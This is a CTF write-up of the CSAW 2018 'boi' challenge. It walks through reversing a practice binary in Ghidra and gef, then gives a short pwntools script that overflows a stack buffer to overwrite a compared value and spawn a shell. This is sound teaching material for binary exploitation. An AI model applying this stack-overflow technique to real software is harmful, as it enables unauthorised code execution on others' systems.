---
title: "Boi CSAW18"
description: "Beginner level pwn challenege from CSAW18"
---


![1_EfJE0qT4iMnWNdDuSkBoaw](https://github.com/user-attachments/assets/e8bb80b0-ca4a-4f64-b952-58450651e839)

`Date: 28 June 2025`

This is a pwn category challenge from CSAW 2018 CTF. In pwn challenges, we need to exploit vulnerabilities in a binary executable—typically by understanding how it handles memory—to gain unintended behavior such as leaking sensitive data, redirecting program execution, or even spawning a shell. This often involves techniques like buffer overflows, format string attacks, use-after-free, or return-oriented programming (ROP), depending on the protections enabled and the binary’s design.

### Table of Content

1. [Initial Analysis](#Initial-Analysis)
2. [Reversing with Ghidra](#reversing-with-ghidra)
3. [GDB-gef](#gdb---gef)
4. [Exploit](#exploit)
5. [Closing Words](#closing-words)

### Initial Analysis

Checking the type of the file :

```
file boi
```

```bash
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```

The given binary is a GNU/Linux executable having debugging information attached to it(not stripped).

Executing it :

```
./boi
```

```bash
Are you a big boiiiii??
yes
Fri Jun 27 04:02:58 PM IST 2025
```

It has a prompt asking a question `Are you a big boiiiii??` whatever you enter `yes` or `no` it will return you the current time and date.

But when i entered a long input something like 

```
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhiiii
```

having `char` length 71 it prints the time and date again but in the next prompt it try to execute the command 

```
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhiiii
```

Which is just the chars stripped from the input.

We can also check for the strings contained in the binary:

```
strings boi
```

`strings` command consider a sequence of char a string if there is more than 3 bytes and it ends with null byte `/0`

output (stripped) :

```bash
...
/bin/bash
/bin/date
...
```

among all the string this two strings looks interesting specially `/bin/bash`

### Reversing with Ghidra

Let's open the Binary in Ghidra 

![Screenshot from 2025-06-28 14-28-06](https://github.com/user-attachments/assets/15e6f3b9-7f78-4a27-bc80-938e5173ce24)


(I have renamed two variables `iStack_2` and `local_38`)

As we can see from the de-compiled code prompt `Are you a big boiiiii??` is printed using puts and input is stored in the variable in the `input_var` variable which of the type `undefined8` which is invalid in C but decompilers use it to indicate a 8 byte data type. 

`read()` function takes three argument - 

1. File Descriptor : It defines how input will be taken. `0` for `stdin` means standard input.
2. Variable Pointer : Address of the variable where the input data will be stored.
3. size of the variable : How much data can be stored.

As we can see here `0x18` or `24` characters can be stored in the stack starting from the address `&input_var` but if we enter a string having more than 24 chars it will overwrite the data stored in stack and this is known as **`variable buffer overflow`**. 

After taking input from the user it will compare a value stored in `Target` with `-0x350c4512` if they are equal it will execute the command `/bin/bash` and if they are not equal  it will execute `/bin/date`.

Ghidra shows value stored in `Target` is `-0x21524111` and the value it is compared with is  `-0x350c4512` but when seen in `gdb` the values are something else :

![Screenshot from 2025-06-28 14-52-36](https://github.com/user-attachments/assets/2d10a3bd-6c40-442b-947d-9f78abce1d10)


so actual value stored in `Target` is `0xdeadbeef` and the value compared with it is `0xcaf3baee` both the values are not actually signed.

Now let's get a view of the stack. You can click on any variable in the Ghidra to get this details -

![Screenshot from 2025-06-28 14-58-44](https://github.com/user-attachments/assets/164e4a22-fcde-414c-9966-bba627a5b01a)


as we can `input_var` starts at `esp-0x38` and `Target` starts at `esp-0x24` so the no. of bytes distance between them is `20` or `0x14` and the size of the `Target` is 4 byte as it is `int` also we can store `0x18` in `input_var` which covers the `0x14` bytes and also overwrite the 4 bytes of `Target`.

### GDB - gef 

We are going to use gdb wrapper [gef](https://github.com/hugsy/gef) for getting better view of the memory. 

```
gdb boi
```

setting breakpoint right after `read` function 

```bash
gef➤  break *main+100
Breakpoint 1 at 0x4006a5
```

```bash
gef➤  r
Starting program: /home/kris3c/Workspace/Learning-Resources/4-Reverse-Engineering/Nightmare/nightmare/modules/04-bof_variable/csaw18_boi/boi 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Are you a big boiiiii??
12345678900

gef➤  search-pattern "12345678900"
[+] Searching '12345678900' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdbb0 - 0x7fffffffdbbd  →   "12345678900\n" 
```

Our input is stored in stack at address `0x7fffffffdbb0` let's check 10 bytes starting from that address -


```bash
gef➤  x/10g 0x7fffffffdbb0
0x7fffffffdbb0:	0x3837363534333231	0xa303039
0x7fffffffdbc0:	0xdeadbeef00000000	0x7fff00000000
0x7fffffffdbd0:	0x7fffffffdcc0	0xca54a3828c560900
0x7fffffffdbe0:	0x7fffffffdc80	0x7ffff7c2a1ca
0x7fffffffdbf0:	0x7fffffffdc30	0x7fffffffdd08
```

Now let's enter more than `0x14` bytes and see the results again 

Input 

```
000000000000000000001111
```

![Screenshot from 2025-06-28 16-57-32](https://github.com/user-attachments/assets/c36ebdb9-719f-43dc-98fe-618f2c4f2558)



First 8 bytes are 0's next 8 bytes are again 0's and then next 4 bytes are 0 completing 20 0's and then four 1's but one thing we should not that the input is registered/stored in stack in little endian format (Least significant bit - ex: in 502 here 2 is least significant so it will be stored as 205 )

Now our task is to give a input that has 20 0's and then 4 bytes representing `0xcaf3baee`

### Exploit 

We can easily write the payload using the library `pwn` which can be installed using :

```
pip3 install pwn
```

`Exploit :`

```python
from pwn import *

target = process("./boi")
payload = b"0" * 0x14 + p32(0xcaf3baee) #p32 is a function in the pwn module which packs 32 bit into 4 byte in little endian format
target.send(payload)

target.interactive()
```

```bash
./my_exploit.py 
[+] Starting local process './boi': pid 32352
[*] Switching to interactive mode
Are you a big boiiiii??
$ whoami
kris3c
$  
```

As you can see we got a shell.

### Closing Words 

Thanks for going through this writeup! I hope it helped you get a solid start with binary exploitation through a classic stack-based buffer overflow. The boi challenge is a great entry point into the world of reverse engineering and pwn CTFs.

Keep practicing, stay curious, and don’t be afraid to dive deeper — there's always more to learn with every binary. If you found this useful, share it with your friends and fellow hackers. Let’s grow this community of builders, breakers, and learners together.

See you in the next challenge. 










